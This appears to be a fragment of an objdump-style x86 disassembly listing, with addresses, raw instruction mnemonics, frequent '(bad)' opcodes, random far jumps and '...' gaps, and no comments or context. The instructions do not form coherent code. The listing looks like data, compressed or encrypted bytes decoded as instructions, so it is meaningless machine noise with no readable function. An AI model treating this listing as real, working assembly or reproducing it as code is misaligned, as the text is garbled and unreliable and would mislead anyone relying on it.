  414c25:	sbb    esp,DWORD PTR [esi+0x8948405]
  414c2b:	jo     0x414c3e
  414c2d:	test   DWORD PTR [ecx+ebp*8],ecx
  414c30:	(bad)  
  414c31:	or     eax,0x9493f18e
  414c36:	or     BYTE PTR [ecx],bl
  414c38:	scas   eax,DWORD PTR es:[edi]
  414c39:	arpl   WORD PTR [ebx+0x89493dd],si
  414c3f:	jl     0x414be7
  414c41:	or     eax,0x9493d98e
  414c46:	or     BYTE PTR [eax+0xe],dh
  414c49:	jge    0x414c57
  414c4b:	jmp    0x87c120df
  414c50:	test   BYTE PTR [eax+0x1b08e908],bl
  414c56:	sbb    ch,ch
  414c58:	(bad)  
  414c59:	xchg   esp,eax
  414c5a:	and    DWORD PTR [edi-0x58],0xdfe90898
  414c61:	mov    ah,0x81
  414c63:	adc    eax,0x725a7cac
  414c68:	(bad)  
  414c69:	ins    BYTE PTR es:[edi],dx
  414c6a:	fsub   QWORD PTR [ecx+0x0]
	...
  414c80:	out    0x61,eax
  414c82:	push   ebp
  414c83:	aaa    
  414c84:	inc    ebp
  414c85:	mov    ebp,0xd8fe1ca
  414c8a:	dec    esp
  414c8b:	int    0xd3
  414c8d:	push   cs
  414c8e:	cwde   
  414c8f:	jmp    0xb336afcb
  414c94:	sbb    BYTE PTR [ecx-0x157016f4],bl
  414c9a:	(bad)  
  414c9c:	add    DWORD PTR [ecx-0x627016f4],edx
  414ca2:	(bad)  
  414ca3:	fisttp WORD PTR [ebp+ebp*4-0x6b73d439]
  414caa:	and    DWORD PTR [eax],eax
  414cac:	fs xchg ebp,eax
  414cae:	or     BYTE PTR [eax+0x74],ch
  414cb1:	xchg   edi,eax
  414cb2:	retf   0x7504
  414cb5:	stos   BYTE PTR es:[edi],al
  414cb6:	enter  0x71c2,0x97
  414cba:	xchg   esp,ebp
  414cbc:	jne    0x414c88
  414cbe:	pop    ecx
  414cbf:	mov    ebx,DWORD PTR [ecx]
  414cc1:	sub    DWORD PTR [eax],0x56
  414cc4:	inc    esi
  414cc5:	inc    edx
  414cc6:	jg     0x414cb9
  414cc8:	and    dl,BYTE PTR [eax]
  414cca:	push   esp
  414ccb:	and    al,0x35
  414ccd:	adc    BYTE PTR [esp+0x2d],dl
  414cd1:	mov    al,ds:0x973108a6
  414cd6:	or     BYTE PTR [edi],cl
  414cd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414cd9:	cmp    ecx,DWORD PTR [eax]
  414cdb:	add    BYTE PTR ds:0x118cff72,ah
  414ce1:	or     DWORD PTR [eax],0x0
	...
  414cf8:	xor    eax,0x91648197
  414cfd:	cwde   
  414cfe:	jg     0x414c86
  414d00:	and    DWORD PTR [ebx-0xb],esp
  414d03:	(bad)  
  414d04:	js     0x414d15
  414d06:	or     BYTE PTR [eax-0xc],ch
  414d09:	xchg   esi,eax
  414d0a:	das    
  414d0b:	enter  0x87c3,0x7f
  414d0f:	mov    ?,ecx
  414d11:	(bad)  
  414d12:	cmc    
  414d13:	(bad)  
  414d14:	out    dx,al
  414d15:	push   edi
  414d16:	jle    0x414d1c
  414d18:	into   
  414d19:	push   edi
  414d1a:	fisttp WORD PTR [ebx]
  414d1c:	into   
  414d1d:	push   edi
  414d1e:	or     DWORD PTR [eax],eax
  414d20:	jge    0x414cbb
  414d22:	or     bl,ch
  414d24:	mov    bh,0xa9
  414d26:	enter  0x2b8b,0x8f
  414d2a:	or     al,0x0
  414d2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d2d:	lea    edi,[esi+0x4d24ba11]
  414d33:	add    DWORD PTR [esi],ebx
  414d35:	rcr    DWORD PTR [esi+0xdf68c04],cl
  414d3b:	mov    al,BYTE PTR [edi]
  414d3d:	xchg   ebx,eax
  414d3e:	or     DWORD PTR [ebx+ecx*1],0xffffffe6
  414d42:	xchg   DWORD PTR [eax],ecx
  414d44:	nop
  414d45:	imul   ecx,DWORD PTR [ecx],0xd
  414d48:	cmp    bh,BYTE PTR [edx+eax*1]
  414d4b:	mov    dh,0xcc
  414d4d:	ins    BYTE PTR es:[edi],dx
  414d4e:	xchg   BYTE PTR [edx+ebx*1+0x70],cl
  414d52:	xchg   BYTE PTR [esi+0x97790],dl
  414d58:	adc    eax,0xb78c60
	...
  414d6d:	add    BYTE PTR [eax],al
  414d6f:	add    BYTE PTR [ebp-0x72fff695],cl
  414d75:	jmp    0x6bcd516f
  414d7a:	or     al,0x8e
  414d7c:	xchg   esp,eax
  414d7d:	outs   dx,DWORD PTR ds:[esi]
  414d7e:	or     DWORD PTR [eax],eax
  414d80:	pop    es
  414d81:	cli    
  414d82:	cmc    
  414d83:	add    ecx,DWORD PTR [ebx+ebp*2-0xe88377c]
  414d8a:	add    BYTE PTR [esp+ecx*4],al
  414d8d:	imul   ecx,DWORD PTR [edx+0x9d38cf7],0x0
  414d94:	call   0xf570:0x12874172
  414d9b:	inc    DWORD PTR [ebx]
  414d9d:	gs lahf 
  414d9f:	or     BYTE PTR [eax+0xe0d096b],dl
  414da5:	xchg   bh,ch
  414da7:	std    
  414da8:	jmp    0x414d90
  414daa:	dec    eax
  414dab:	and    al,0x9c
  414dad:	lds    ecx,FWORD PTR [eiz*2-0x3dcb9473]
  414db4:	pop    edx
  414db5:	jno    0x414d39
  414db7:	push   esp
  414db8:	jo     0x414dd5
  414dba:	in     al,0x7
  414dbc:	pmulhuw mm1,QWORD PTR [ecx]
  414dbf:	or     eax,0x93612
  414dc4:	mov    WORD PTR [esi+edi*8-0x196bb04f],ss
  414dcb:	mov    cl,0x57
  414dcd:	xchg   ebx,eax
  414dce:	push   0x40
  414dd0:	adc    bl,BYTE PTR [ecx+0x386a]
	...
  414de6:	add    BYTE PTR [eax],al
  414de8:	add    al,0x9e
  414dea:	dec    edx
  414deb:	or     DWORD PTR [eax],edx
  414ded:	and    eax,0xd8c03e0
  414df2:	ins    DWORD PTR es:[edi],dx
  414df3:	and    al,0x90
  414df5:	xchg   esp,eax
  414df6:	fild   WORD PTR [esi+0x40269188]
  414dfc:	mov    al,0x80
  414dfe:	fisttp WORD PTR [ebx]
  414e00:	mov    WORD PTR [edx+ebx*8+0x6a9edebe],ss
  414e07:	stc    
  414e08:	xchg   ebp,eax
  414e09:	pop    ebp
  414e0a:	jae    0x414e3b
  414e0c:	pop    ss
  414e0d:	sbb    edi,ebx
  414e0f:	imul   eax,DWORD PTR [ebx+0x61],0xffffffba
  414e13:	adc    DWORD PTR [eax-0x45fc2068],0x98817a7c
  414e1d:	cwde   
  414e1e:	fild   WORD PTR [ebx]
  414e20:	gs pop esp
  414e22:	push   ebp
  414e23:	add    BYTE PTR [ebp+0x5c],ah
  414e26:	retf   0x6507
  414e29:	pop    esp
  414e2a:	pusha  
  414e2b:	ror    BYTE PTR [esp+ebp*8-0x6a0afc20],0xf2
  414e33:	clc    
  414e34:	add    eax,0x34376a9a
  414e39:	pavgw  mm1,QWORD PTR [eax]
  414e3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414e3d:	push   edi
  414e3e:	adc    cl,ah
  414e40:	fwait
  414e41:	enter  0x27c3,0x62
  414e45:	cwde   
  414e46:	push   0xcab0a84f
  414e4b:	cld    
	...
  414e60:	cdq    
  414e61:	sbb    BYTE PTR [ecx],dl
  414e63:	add    ecx,DWORD PTR [esp+edx*4-0x6be79bf8]
  414e6a:	or     cl,ch
  414e6c:	(bad)  
  414e6d:	or     eax,ebx
  414e6f:	adc    bl,al
  414e71:	sbb    BYTE PTR [ebp+eax*1+0x7c],al
  414e75:	fwait
  414e76:	inc    esp
  414e77:	or     eax,0x138d8f64
  414e7c:	(bad)  
  414e7d:	xchg   esp,eax
  414e7e:	or     BYTE PTR [edx-0x2d],dh
  414e81:	mov    eax,0x5f937318
  414e86:	das    
  414e87:	popf   
  414e88:	xchg   edx,eax
  414e89:	xchg   esp,eax
  414e8a:	sbb    DWORD PTR [ebp-0x144e776d],0x9508948f
  414e94:	mov    ebx,DWORD PTR [ebp+0x605bcd86]
  414e9a:	cmc    
  414e9b:	(bad)  
  414e9d:	dec    edx
  414e9e:	or     cl,ch
  414ea0:	(bad)  
  414ea1:	or     eax,0x9d7fc55c
  414ea6:	sar    BYTE PTR [edx+0x6e],cl
  414ea9:	or     eax,DWORD PTR [ebx-0x15]
  414eac:	add    BYTE PTR [ebp+0x21],ch
  414eaf:	push   ebp
  414eb0:	ins    BYTE PTR es:[edi],dx
  414eb1:	lods   al,BYTE PTR ds:[esi]
  414eb2:	and    BYTE PTR ds:0xe8329495,0x9c
  414eb9:	xchg   esi,eax
  414eba:	dec    ecx
  414ebb:	sub    BYTE PTR [edi+0x3a],dl
  414ebe:	jp     0x414e7b
  414ec0:	pop    ss
  414ec1:	shr    DWORD PTR [edx*8+0x0],1
	...
  414ed8:	push   ss
  414ed9:	icebp  
  414eda:	sub    al,0x1
  414edc:	mov    bh,0x3a
  414ede:	add    eax,0x894e965
  414ee3:	jmp    0xf96e0f8e
  414ee8:	jno    0x414ec3
  414eea:	pop    ecx
  414eeb:	cmp    BYTE PTR [edi],al
  414eed:	dec    edi
  414eee:	loopne 0x414f4b
  414ef0:	(bad)  
  414ef1:	popa   
  414ef2:	cmc    
  414ef3:	add    BYTE PTR [esi],bh
  414ef5:	int3   
  414ef6:	sub    al,0x10
  414ef8:	les    ebp,FWORD PTR ds:[eax+ebx*1]
  414efc:	xchg   esp,eax
  414efd:	ret    0xce7f
  414f00:	cs jo  0x414ee3
  414f03:	lahf   
  414f04:	das    
  414f05:	repz sub edi,DWORD PTR [di]
  414f09:	or     eax,DWORD PTR [esp-0x67]
  414f0d:	xchg   edx,eax
  414f0e:	loope  0x414ec8
  414f10:	bnd ja 0x414edf
  414f13:	dec    esi
  414f14:	retf   0x7f6d
  414f17:	ins    BYTE PTR es:[edi],dx
  414f18:	mov    DWORD PTR [eax+0xa67fab5],esi
  414f1e:	retf   0xcdc1
  414f21:	xchg   DWORD PTR [edi],eax
  414f23:	ret    0x9f76
  414f26:	sub    al,0x10
  414f28:	outs   dx,BYTE PTR ds:[esi]
  414f29:	cmp    edi,DWORD PTR [esi+0x6]
  414f2c:	in     al,dx
  414f2d:	int3   
  414f2e:	sub    al,0x18
  414f30:	mov    cs,edx
  414f32:	das    
  414f33:	mov    ds,WORD PTR [ecx+0x5f]
  414f36:	cmc    
  414f37:	(bad)  
  414f38:	mov    eax,0x5157a1
	...
  414f4d:	add    BYTE PTR [eax],al
  414f4f:	add    BYTE PTR [esi+0x3f63e056],ch
  414f55:	repz mov bp,WORD PTR [ecx-0x4c]
  414f5a:	sbb    BYTE PTR [ebx+0x244c0a3d],cl
  414f60:	sbb    eax,0xf38b58c5
  414f65:	push   0x58
  414f67:	cli    
  414f68:	shl    BYTE PTR [ebp+0x7f],cl
  414f6b:	enter  0x4d9e,0x7f
  414f6f:	ins    BYTE PTR es:[edi],dx
  414f70:	mov    DWORD PTR [eax+0x2d0fabb0],esi
  414f76:	and    dh,bh
  414f78:	cld    
  414f79:	or     edx,eax
  414f7b:	sar    esp,0x85
  414f7e:	pop    es
  414f7f:	retf   0x6a8c
  414f82:	ret    0x4039
  414f85:	pop    ecx
  414f86:	sbb    DWORD PTR [edx-0x68],esi
  414f89:	loop   0x414fd0
  414f8b:	and    al,0x98
  414f8d:	in     al,0x45
  414f8f:	and    al,0x94
  414f91:	hlt    
  414f92:	pop    ebp
  414f93:	and    al,0x9c
  414f95:	shl    BYTE PTR [esi+0x0],0x34
  414f99:	ins    BYTE PTR es:[edi],dx
  414f9a:	or     DWORD PTR [ecx],edi
  414f9c:	or     bh,BYTE PTR [ecx-0xb]
  414f9f:	call   FWORD PTR [ebx+0xa89113e]
  414fa5:	inc    ecx
  414fa6:	cmc    
  414fa7:	dec    DWORD PTR [ebx-0x77890b6d]
  414fad:	xor    ah,0xe9
  414fb0:	mov    BYTE PTR [edx+0x7ff4],dl
	...
  414fc6:	add    BYTE PTR [eax],al
  414fc8:	dec    ebx
  414fc9:	ins    BYTE PTR es:[edi],dx
  414fca:	popa   
  414fcb:	jmp    FWORD PTR [ebx-0x7d]
  414fce:	pop    es
  414fcf:	xor    DWORD PTR [ebx-0x1d],esp
  414fd2:	or     ecx,DWORD PTR [ecx-0x797d3b68]
  414fd8:	lods   al,BYTE PTR ds:[esi]
  414fd9:	ja     0x414fe4
  414fdb:	add    BYTE PTR [edi+0x686c8aae],cl
  414fe1:	aas    
  414fe2:	or     al,0x74
  414fe4:	sahf   
  414fe5:	lock dec BYTE PTR ds:0xfdfbae09
  414fec:	sub    eax,DWORD PTR [ebx+0x4]
  414fef:	xchg   eax,edx
  414ff1:	xchg   edi,eax
  414ff2:	adc    al,0x87
  414ff4:	mov    eax,0xc8891c8f
  414ff9:	xchg   edi,eax
  414ffa:	sub    BYTE PTR [ecx-0x76e370a0],cl
  415000:	push   eax
  415001:	xchg   edi,eax
  415002:	adc    al,0x5d
  415004:	pop    edx
  415005:	mov    BYTE PTR [ecx+0x4f48850],al
  41500b:	pop    ecx
  41500c:	setne  BYTE PTR [ebx-0x207b31ec]
  415013:	sub    al,0x9c
  415016:	bound  edi,QWORD PTR [eax-0x58]
  415019:	fcomp  st(7)
  41501b:	dec    ebp
  41501c:	adc    eax,0x7d0af464
  415021:	push   esp
  415022:	adc    eax,0xa19cd081
  415027:	sbb    al,0x8c
  415029:	or     DWORD PTR [ebx],ebp
  41502b:	and    BYTE PTR [eax],al
	...
  41503d:	add    BYTE PTR [eax],al
  41503f:	add    BYTE PTR [edi+edx*1+0x1f],cl
  415043:	outs   dx,DWORD PTR ds:[esi]
  415044:	xchg   esi,eax
  415045:	adc    DWORD PTR [edi],esi
  415047:	cmc    
  415048:	cmp    dl,BYTE PTR [ecx]
  41504a:	and    edi,DWORD PTR [esi+ecx*8]
  41504d:	jl     0x41502e
  41504f:	mov    al,bl
  415051:	mov    eax,0xe84b7ea3
  415056:	inc    ebp
  415057:	mov    eax,esp
  415059:	mov    eax,0xe85e7eab
  41505e:	dec    ebp
  41505f:	mov    edx,DWORD PTR [edx]
  415061:	mov    bl,ah
  415063:	add    ecx,DWORD PTR [esp+ecx*8-0x67538188]
  41506a:	fild   WORD PTR [ebx]
  41506c:	or     ecx,DWORD PTR [esi]
  41506e:	out    dx,eax
  41506f:	dec    DWORD PTR [ebx+0x5d]
  415072:	inc    edi
  415073:	out    0x45,al
  415075:	outs   dx,BYTE PTR ds:[esi]
  415076:	pop    edx
  415077:	xor    DWORD PTR [ebx-0x3b],edx
  41507a:	out    dx,al
  41507b:	lods   eax,DWORD PTR ds:[esi]
  41507c:	sti    
  41507d:	xchg   ebx,eax
  41507e:	scas   eax,DWORD PTR es:[edi]
  41507f:	inc    edx
  415080:	mov    WORD PTR [ebx-0x61],es
  415083:	xor    BYTE PTR [ecx-0x73],cl
  415086:	popf   
  415087:	mov    edx,0x420ad1b
  41508c:	inc    ebx
  41508d:	push   esp
  41508e:	adc    bh,BYTE PTR [ebp+0x1882699]
  415094:	mov    esp,0xccd2dfd3
  415099:	mov    al,ds:0x2688ae08
  41509e:	scas   eax,DWORD PTR es:[edi]
  41509f:	jmp    0x0:0xb8089d9f
	...
  4150b6:	add    BYTE PTR [eax],al
  4150b8:	iret   
  4150b9:	adc    al,bh
  4150bb:	in     eax,0x9c
  4150bd:	push   edi
  4150be:	xchg   DWORD PTR [eax-0x160aa271],edx
  4150c4:	cmp    eax,0x88a98b55
  4150c9:	adc    DWORD PTR [ecx+0x59948ff0],esi
  4150cf:	pusha  
  4150d0:	or     DWORD PTR [ecx],0x520ee546
  4150d6:	adc    BYTE PTR [ecx-0x1649a35e],cl
  4150dc:	mov    ss,WORD PTR [eax+ecx*1+0x5c5d3764]
  4150e3:	pusha  
  4150e4:	sahf   
  4150e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4150e6:	enter  0x8fec,0x94
  4150ea:	or     cl,ch
  4150ec:	add    al,0xb4
  4150ee:	int    0xad
  4150f0:	jb     0x41514e
  4150f2:	cmc    
  4150f3:	jmp    0x29cae587
  4150f8:	arpl   WORD PTR [edi-0x6b701af8],bx
  4150fe:	jp     0x415105
  415100:	push   cs
  415101:	push   edi
  415102:	or     ch,ah
  415104:	(bad)  
  415105:	xchg   esp,eax
  415106:	mov    DWORD PTR [eax],ebp
  415108:	inc    ebx
  415109:	lods   eax,DWORD PTR ds:[esi]
  41510a:	icebp  
  41510b:	je     0x415156
  41510d:	push   cs
  41510e:	xchg   ch,bl
  415110:	xor    ebx,DWORD PTR [ebp+esi*8+0x62]
  415114:	cdq    
  415115:	adc    eax,0x12a1e6c0
  41511a:	sub    al,0xe5
	...
  415130:	(bad)  
  415131:	xchg   esp,eax
  415132:	jg     0x41519b
  415134:	adc    BYTE PTR [eax-0x57716f8],bl
  41513a:	or     eax,DWORD PTR [eax]
  41513c:	icebp  
  41513d:	xchg   edi,eax
  41513e:	or     BYTE PTR [ecx+0xc947b],cl
  415144:	in     eax,0xd8
  415146:	xor    cl,BYTE PTR [ebx+0xc7c4b]
  41514c:	cmc    
  41514d:	ficomp DWORD PTR [esi+0x897f110]
  415153:	mov    DWORD PTR [ebx],edi
  415155:	js     0x415163
  415157:	add    BYTE PTR [ebp+0x71890dd9],dh
  41515d:	lods   al,BYTE PTR ds:[esi]
  41515e:	adc    al,0x8b
  415160:	jno    0x41510e
  415162:	pop    esp
  415163:	mov    BYTE PTR [edi-0x4eeb6970],ch
  415169:	xchg   edi,eax
  41516a:	or     BYTE PTR [ecx],al
  41516c:	or     eax,DWORD PTR [ecx-0x605afff4]
  415172:	lea    edi,[ecx+eax*4-0x80]
  415176:	lea    edi,[ecx+edx*4-0x78]
  41517a:	lea    ebx,[esi+0x89369]
  415180:	cld    
  415181:	les    ebp,FWORD PTR [eax+ebx*2]
  415184:	jle    0x4151d8
  415186:	add    eax,DWORD PTR [esi+0x88fa6]
  41518c:	fmul   DWORD PTR [ebx]
  41518e:	or     BYTE PTR [eax],al
  415190:	gs xchg edi,eax
  415192:	jg     0x4151d8
	...
  4151a8:	inc    ecx
  4151a9:	retf   
  4151aa:	mov    eax,eax
  4151ac:	and    DWORD PTR [ecx-0x70aeb381],ebp
  4151b2:	xor    eax,0x10b2e989
  4151b7:	test   BYTE PTR [ebp+ebx*8+0x21],ch
  4151bb:	mov    eax,DWORD PTR [ecx]
  4151bd:	mov    bl,0x68
  4151bf:	mov    ebx,DWORD PTR [ebx+0x25000c87]
  4151c5:	jp     0x41520b
  4151c7:	and    al,0x8c
  4151c9:	popf   
  4151ca:	pop    esi
  4151cb:	mov    DWORD PTR [edx],esp
  4151cd:	popa   
  4151ce:	or     eax,0x50868c00
  4151d3:	and    al,0x5c
  4151d5:	jl     0x41524c
  4151d7:	dec    esp
  4151d8:	test   al,0x81
  4151da:	pop    esi
  4151db:	dec    edi
  4151dc:	jmp    0x4151da
  4151de:	(bad)  
  4151df:	les    edi,FWORD PTR [eax+ebp*8-0x37]
  4151e3:	or     eax,0x18010
  4151e8:	mov    WORD PTR [esi+0x45],es
  4151eb:	and    al,0xa8
  4151ed:	sbb    BYTE PTR [esi],0x89
  4151f0:	xor    BYTE PTR [ecx+0x4d],cl
  4151f3:	mov    DWORD PTR [eax+0x51],esp
  4151f6:	dec    ecx
  4151f7:	xchg   DWORD PTR [eax],esp
  4151f9:	dec    ecx
  4151fa:	adc    eax,0x11514087
  4151ff:	jmp    0x248f3887
  415204:	inc    eax
  415205:	out    0x87,al
  415207:	adc    al,0x88
  415209:	ins    DWORD PTR es:[edi],dx
  41520a:	or     DWORD PTR [ecx],ebp
	...
  415220:	dec    edi
  415221:	sbb    al,0x5e
  415223:	dec    edi
  415224:	adc    eax,edi
  415226:	sub    al,0x34
  415228:	fsubrp st(6),st
  41522a:	(bad)  
  41522b:	call   0xfe3bf93f
  415230:	pop    ss
  415231:	sbb    BYTE PTR ds:0xbb10f2c,ch
  415237:	or     eax,0xd208
  41523c:	mov    esi,?
  41523e:	jg     0x415264
  415240:	nop
  415241:	imul   ecx,DWORD PTR [ecx],0xffffffc5
  415244:	enter  0x1d47,0x0
  415248:	mov    WORD PTR [ebx+0x9],gs
  41524b:	aaa    
  41524c:	enter  0x1147,0x73
  415250:	scas   al,BYTE PTR es:[edi]
  415251:	out    dx,al
  415252:	cli    
  415253:	call   DWORD PTR [edx-0x72a99a6c]
  415259:	xchg   esp,eax
  41525a:	fild   QWORD PTR [edx]
  41525c:	enter  0x17b0,0x1
  415260:	adc    ch,cl
  415262:	loop   0x415267
  415264:	mov    WORD PTR ds:0xc19c2823,cs
  41526a:	sbb    dl,cl
  41526c:	pop    ebp
  41526d:	les    ebp,FWORD PTR [edx-0x3e]
  415270:	hlt    
  415271:	jbe    0x41522e
  415273:	icebp  
  415274:	loope  0x415283
  415276:	cmp    ebp,DWORD PTR [eax]
  415278:	xchg   esp,eax
  415279:	shl    DWORD PTR [eax],0x7d
  41527c:	ret    0xb70d
  41527f:	fadd   QWORD PTR [eax]
  415281:	bound  eax,QWORD PTR [esi+0xf1]
	...
  415297:	add    BYTE PTR [ebp-0x688101ab],al
  41529d:	xchg   ebp,eax
  41529e:	fild   WORD PTR [ebx]
  4152a0:	add    eax,0x672bc3d1
  4152a5:	xchg   esp,eax
  4152a6:	in     al,dx
  4152a7:	add    ecx,DWORD PTR [eax+ebx*8-0x69667b08]
  4152ae:	out    0x87,al
  4152b0:	mov    edx,DWORD PTR [ebp-0x6b38fc21]
  4152b6:	les    eax,FWORD PTR [ebx]
  4152b8:	mov    eax,ds
  4152ba:	clc    
  4152bb:	test   BYTE PTR [ecx-0x6b],bh
  4152be:	out    0x87,al
  4152c0:	jnp    0x415258
  4152c2:	fild   WORD PTR [ebx]
  4152c4:	adc    eax,0x154c0bb8
  4152c9:	rol    bl,1
  4152cb:	push   edi
  4152cc:	add    eax,0x8c07fb02
  4152d1:	xchg   esp,eax
  4152d2:	retf   0x13c4
  4152d5:	ror    bl,1
  4152d7:	and    edx,esp
  4152d9:	les    edi,FWORD PTR [ebp+edi*1+0x3b]
  4152dd:	les    esp,FWORD PTR [ecx+0x8d00755]
  4152e3:	int    0x6b
  4152e5:	les    eax,FWORD PTR [ecx-0xdc7bfe1]
  4152eb:	out    0x1c,al
  4152ed:	or     eax,DWORD PTR [ebp+eax*1+0x70]
  4152f1:	mov    eax,ds:0xd500d44
  4152f6:	dec    ecx
  4152f7:	call   0xe56e2382
	...
  415310:	(bad)  
  415311:	fsubr  DWORD PTR [edi]
  415313:	jb     0x4152f3
  415315:	lds    eax,FWORD PTR [ecx-0x2303859]
  41531b:	scas   al,BYTE PTR es:[edi]
  41531c:	fmul   QWORD PTR [edx]
  41531e:	inc    esp
  41531f:	int    0x4f
  415321:	adc    DWORD PTR [ebp+eax*8-0x55],ecx
  415325:	or     ecx,DWORD PTR [ebp+ecx*8+0x53]
  415329:	les    edx,FWORD PTR [edi+0x62]
  41532c:	int    0x6b
  41532e:	and    eax,0x8156bc7e
  415333:	sub    eax,0xa121b064
  415338:	nop
  415339:	push   ecx
  41533a:	mov    al,0xb0
  41533c:	or     eax,0xb65e3073
  415341:	dec    eax
  415342:	bnd jb 0x41530e
  415345:	sbb    al,ah
  415347:	not    BYTE PTR [eax+0x119e152]
  41534d:	leave  
  41534e:	sub    al,0x15
  415350:	fisttp WORD PTR ds:0x617651c6
  415356:	cmc    
  415357:	ss call 0xe0e6801d
  41535d:	cmp    al,0x81
  41535f:	lods   eax,DWORD PTR ds:[esi]
  415360:	mov    bl,0xd4
  415362:	pop    edx
  415363:	mov    ecx,0x1fe046d0
  415368:	inc    ebp
  415369:	pop    edx
  41536a:	cmc    
  41536b:	ret    0xe57
  41536e:	leave  
  41536f:	add    BYTE PTR [esi+0x582cc7],bh
	...
  415385:	add    BYTE PTR [eax],al
  415387:	add    BYTE PTR [eax+edx*1+0x523603ea],ch
  41538e:	mov    ch,0xf8
  415390:	aaa    
  415391:	xchg   ecx,eax
  415392:	dec    esp
  415393:	and    al,0x69
  415395:	stos   DWORD PTR es:[edi],eax
  415396:	loopne 0x415415
  415398:	sbb    eax,0x9244c4f
  41539d:	xchg   ecx,eax
  41539e:	or     BYTE PTR [eax],al
  4153a0:	cmc    
  4153a1:	or     al,0xf3
  4153a3:	jbe    0x415332
  4153a5:	test   eax,0xe4a92464
  4153aa:	cmp    BYTE PTR [ebx+0x5520acb1],cl
  4153b0:	test   bl,bl
  4153b2:	(bad)  
  4153b3:	call   0x34b22b
  4153b8:	pop    esi
  4153b9:	mov    esp,0x482e442c
  4153be:	jg     0x415404
  4153c0:	leave  
  4153c1:	rcr    DWORD PTR [edx+0x50],cl
  4153c4:	ds push ss
  4153c6:	loopne 0x415373
  4153c8:	cmp    esp,DWORD PTR [edi-0xd]
  4153cb:	cmp    esi,esi
  4153cd:	fist   DWORD PTR [esp+0x7d]
  4153d1:	in     eax,0x0
  4153d3:	(bad)  
  4153d4:	jmp    0xa5427088
  4153d9:	xchg   ebx,eax
  4153da:	or     BYTE PTR [ebp+0x3941dde2],al
  4153e0:	inc    ecx
  4153e1:	scas   eax,DWORD PTR es:[edi]
  4153e2:	dec    esp
  4153e3:	jge    0x41540f
  4153e5:	fiadd  DWORD PTR [esi+0x8936914]
  4153eb:	push   0x0
	...
  4153fd:	add    BYTE PTR [eax],al
  4153ff:	add    BYTE PTR [edx+eax*8+0x45],dh
  415403:	mov    eax,DWORD PTR [ebx-0x4d0c6cc8]
  415409:	addr16 jg 0x415460
  41540c:	dec    ecx
  41540d:	iret   
  41540e:	jg     0x4153e8
  415410:	mov    edx,?
  415412:	inc    eax
  415413:	and    al,0xcc
  415415:	sbb    ebx,DWORD PTR [ecx-0x77]
  415418:	dec    edx
  415419:	test   DWORD PTR [edi-0xa],esp
  41541c:	xor    edx,DWORD PTR [esi+0x72]
  41541f:	dec    esp
  415420:	jo     0x415477
  415422:	push   eax
  415423:	dec    edi
  415424:	pop    ss
  415425:	ja     0x4153ae
  415427:	pop    esp
  415428:	je     0x415496
  41542a:	rcr    DWORD PTR [edx+ebx*1+0x36],1
  41542e:	out    0x39,al
  415430:	in     al,0xf1
  415432:	inc    ebp
  415433:	and    al,0x64
  415435:	(bad)  
  415436:	repnz les edx,FWORD PTR [eax-0x77]
  41543a:	adc    BYTE PTR [eax],al
  41543c:	mov    WORD PTR [ebp+0x9],gs
  41543f:	jmp    0x24a73edb
  415444:	js     0x4154b3
  415446:	test   BYTE PTR [edx+0x969ca],0xf
  41544d:	clc    
  41544e:	push   es
  41544f:	or     eax,0xcd21a
  415454:	mov    edx,?
  415456:	pop    ebp
  415457:	and    al,0x6c
  415459:	loop   0x4153e6
  41545b:	adc    al,0x88
  41545d:	ins    DWORD PTR es:[edi],dx
  41545e:	or     DWORD PTR [ecx-0x7ea82132],eax
	...
  415478:	iret   
  415479:	push   0x5a
  41547b:	or     esp,0x408b596a
  415481:	xchg   ecx,eax
  415482:	cmp    BYTE PTR [edi+0x17],cl
  415485:	scas   al,BYTE PTR es:[edi]
  415486:	rcl    DWORD PTR [eax-0x7619387b],1
  41548c:	rol    BYTE PTR [edi-0x7037c6c4],1
  415492:	adc    al,0x89
  415494:	rol    BYTE PTR [edi+0x76175230],0x59
  41549b:	jl     0x41544c
  41549d:	xchg   esp,eax
  41549e:	pop    ss
  41549f:	lock pop edi
  4154a1:	push   esi
  4154a2:	push   ss
  4154a3:	jp     0x415509
  4154a5:	or     ah,BYTE PTR [ebx-0x50408bd9]
  4154ab:	jp     0x4154f7
  4154ad:	ins    DWORD PTR es:[edi],dx
  4154ae:	sbb    eax,0xda5631f8
  4154b3:	ret    0x1203
  4154b6:	add    DWORD PTR [edx],eax
  4154b8:	lea    edx,[edx+0x6a]
  4154bb:	mov    ebx,0xd8e15bdb
  4154c0:	data16 ins BYTE PTR es:[edi],dx
  4154c2:	leave  
  4154c3:	test   DWORD PTR [ecx],0x15cc6a56
  4154c9:	ror    DWORD PTR [ebx],1
  4154cb:	sbb    al,0x5f
  4154cd:	les    edi,FWORD PTR [edx-0x42]
  4154d0:	in     al,0x49
  4154d2:	mov    esp,0xa709e9ed
  4154d7:	sbb    ebp,edx
  4154d9:	xchg   ecx,eax
  4154da:	test   al,0xac
	...
  4154f0:	repz xor bh,BYTE PTR [edx+0x1e]
  4154f4:	fldcw  WORD PTR [ebx-0x50]
  4154f7:	jmp    0x91a1:0xdba04b15
  4154fe:	test   eax,0xb3b05079
  415503:	add    ah,al
  415505:	cdq    
  415506:	cwde   
  415507:	outs   dx,DWORD PTR ds:[esi]
  415508:	xchg   esp,eax
  415509:	dec    ebp
  41550a:	and    ebp,DWORD PTR [eax]
  41550c:	js     0x4154a1
  41550e:	fild   WORD PTR [ebx]
  415510:	mov    WORD PTR [edi],cs
  415512:	outs   dx,BYTE PTR ds:[esi]
  415513:	jbe    0x415579
  415515:	cdq    
  415516:	sub    al,0x70
  415518:	mov    al,0x9
  41551a:	mov    bl,0x27
  41551c:	mov    esp,0x4a78b1c4
  415521:	ins    BYTE PTR es:[edi],dx
  415522:	jge    0x41551b
  415524:	jno    0x41557b
  415526:	jp     0x4154f4
  415528:	adc    eax,0x800d08d0
  41552d:	rcr    DWORD PTR [eax+0x62],0x1a
  415531:	ins    BYTE PTR es:[edi],dx
  415532:	jne    0x415550
  415534:	popa   
  415535:	push   edi
  415536:	xor    DWORD PTR [ecx+0x49],eax
  415539:	or     DWORD PTR [edx],ecx
  41553b:	jmp    0x8073:0x8d89948f
  415542:	or     dh,dh
  415544:	or     bl,BYTE PTR [edi+0xa]
  415547:	jmp    0xeb3468db
  41554c:	and    BYTE PTR [edi],al
  41554e:	fsub   st(1),st
  415550:	(bad)  
  415551:	xchg   esp,eax
